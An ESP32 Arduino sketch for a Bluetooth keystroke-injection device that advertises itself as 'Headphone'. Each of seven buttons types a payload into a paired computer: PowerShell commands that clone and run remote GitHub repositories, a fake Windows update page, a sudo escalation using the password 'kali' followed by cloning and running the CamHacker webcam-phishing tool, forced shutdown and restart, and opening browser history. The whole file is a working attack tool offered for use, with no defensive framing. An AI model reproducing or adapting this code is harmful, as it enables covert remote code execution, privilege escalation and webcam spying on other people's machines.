#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Button 1 (Trigger: Password Manager)
#define BUTTON_2_PIN 17 // Button 2 (Trigger: Secret Messaging)
#define BUTTON_3_PIN 18 // Button 3 (Trigger: Fake Update Screen)
#define BUTTON_4_PIN 19 // Button 4 (Trigger: CamHacker)
#define BUTTON_5_PIN 21 // Button 5 (Trigger: Shut Down)
#define BUTTON_6_PIN 22 // Button 6 (Trigger: Restart)
#define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;
bool lastState7 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(900); // Updated to 900ms as per request
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup with 7 Triggers on Buttons 1-7 (Pins 16, 17, 18, 19, 21, 22, 23)...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000);
  bleKeyboard.begin();
  Serial.println("BLE ready. Connect as 'Headphone'.");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);

    // Button 1: Password Manager (Pin 16)
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Button 1: Password Manager (Pin 16)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Password-Manager.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Password-Manager", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python password.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Password Manager Payload executed");
    }

    // Button 2: Secret Messaging (Pin 17)
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Button 2: Secret Messaging (Pin 17)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Secret-Messaging", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python code2.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Secret Messaging Payload executed");
    }

    // Button 3: Fake Update Screen (Pin 18)
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Button 3: Fake Update Screen (Pin 18)");
      openRun();
      sendString("https://fakeupdate.net/win10ue/", 10); delay(100);
      bleKeyboard.press(KEY_RETURN); delay(100);
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Fake Update Screen Payload executed");
    }

    // Button 4: CamHacker (Pin 19)
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Button 4: CamHacker (Pin 19)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(4000);
      sendString("cd Desktop", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("sudo su", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("kali", 10); delay(3000); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("git clone https://github.com/KasRoudra/CamHacker", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd CamHacker", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("bash ch.sh", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("CamHacker Payload executed");
    }

    // Button 5: Shut Down (Pin 21)
    if (lastState5 == HIGH && state5 == LOW) {
      Serial.println("Button 5: Shut Down (Pin 21)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('x'); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('u'); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('u'); delay(100);
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Shut Down Payload executed");
    }

    // Button 6: Restart (Pin 22)
    if (lastState6 == HIGH && state6 == LOW) {
      Serial.println("Button 6: Restart (Pin 22)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('x'); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('u'); delay(100);
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('r'); delay(100);
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Restart Payload executed");
    }

    // Button 7: Chrome History/Downloads (Pin 23)
    if (lastState7 == HIGH && state7 == LOW) {
      Serial.println("Button 7: Chrome History/Downloads (Pin 23)");
      openRun();
      sendString("chrome", 10); delay(2000);
      bleKeyboard.press(KEY_RETURN); delay(100);
      bleKeyboard.releaseAll(); delay(2000);
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press('h'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press('j'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Chrome History/Downloads Payload executed");
    }

    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
    lastState7 = state7;
  } else {
    Serial.println("Waiting for BLE connection...");
  }
  delay(50); // Debounce/stability
}
